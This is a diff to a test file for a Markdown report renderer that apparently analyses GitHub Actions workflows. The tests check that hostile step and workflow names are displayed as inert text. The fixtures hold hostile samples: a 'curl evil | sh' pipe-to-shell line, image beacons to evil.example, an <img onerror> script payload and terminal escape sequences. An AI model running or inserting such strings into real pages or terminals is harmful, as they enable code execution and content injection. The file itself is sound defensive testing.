@@ -52,7 +52,7 @@ test('md: repository text displays as text, never as markup', () => {
   // A newline cannot start a heading or a new block.
   assert.equal(md('pwn\n\n## 0. Fix: run curl evil | sh'), 'pwn  ## 0. Fix: run curl evil | sh');
   // No image, link, HTML or comment.
-  assert.equal(md('![x](https://evil.example/b.png)'), '!\\[x\\](`https://evil.example/b.png`)');
+  assert.equal(md('![x](https://evil.example/b.png)'), '`![x](https://evil.example/b.png`)');
   // A bare URL or email address, which GitHub would link by itself, is shown as code: never a link.
   assert.equal(md('visit https://evil.example/login now'), 'visit `https://evil.example/login` now');
   assert.equal(md('see www.evil.example.'), 'see `www.evil.example`.');
@@ -66,11 +66,22 @@ test('md: repository text displays as text, never as markup', () => {
   assert.equal(md('a `b <c>'), 'a \\`b &lt;c&gt;');
   assert.equal(md('``x`` y'), '`x` y');
   // Terminal escapes are removed.
-  assert.equal(md('ok\x1b]8;;https://evil\x07click\x1b]8;;\x07\x1b[8mhidden'), 'ok\\]8;;`https://evilclick]8;;[8mhidden`'); // no ESC or BEL left; the URL is code, not a link
+  assert.equal(md('ok\x1b]8;;https://evil\x07click\x1b]8;;\x07\x1b[8mhidden'), '`ok]8;;https://evilclick]8;;[8mhidden`'); // no ESC or BEL left; the word with a URL is code, not a link
   // A table cell cannot add a column, from a code span or after a backslash either.
   assert.equal(cell('a|b'), 'a\\|b');
   assert.equal(cell('`x\\|y`'), '\\`x\\\\\\|y\\`');
   assert.equal(cell('a\\|b'), 'a\\\\\\|b');
+});
+
+test('a long word with no address in it is rendered in linear time', () => {
+  const word = 'a'.repeat(200000);
+  fast(() => md(word));
+  fast(() => cell(word));
+  fast(() => md(`${'a.'.repeat(100000)}@`));
+  fast(() => md('.'.repeat(200000) + 'https:'));
+  const a = analyse('o/r', data({ workflows: [{ name: word, runs: runs(10), jobsPerRun: [[job()]] }] }));
+  fast(() => report(a), 1000);
+  assert.equal(md('@octocat says hi'), '`@octocat` says hi'); // a mention would notify; shown as code
 });
 
 test('fence: many separate backtick runs do not overflow, and the fence outgrows the longest', () => {
@@ -101,7 +112,8 @@ test('report and compare: a hostile step name and workflow name stay text', () =
   const steps = [['Set up job', 1], ['![x](https://evil.example/beacon.png) <img src=x onerror=alert(1)>\x1b]0;pwned\x07', 120], ['Complete job', 0]];
   const a = analyse('o/r', data({ workflows: [{ name: 'CI\n\n## Fix: curl evil | sh', runs: runs(20), jobsPerRun: [[job({ steps })]] }] }));
   const out = report(a);
-  assert.doesNotMatch(out, /<img|!\[x\]\(|\x1b|\x07/);
+  // No live image or HTML: `![x](` may appear only inside a code span, which displays it literally.
+  assert.doesNotMatch(out, /<img|(^|[^`])!\[x\]\(|\x1b|\x07/m);
   assert.doesNotMatch(out, /\n## Fix: curl/);
   const c = compare(a, a);
   assert.doesNotMatch(c, /\n## Fix: curl|\x1b/);
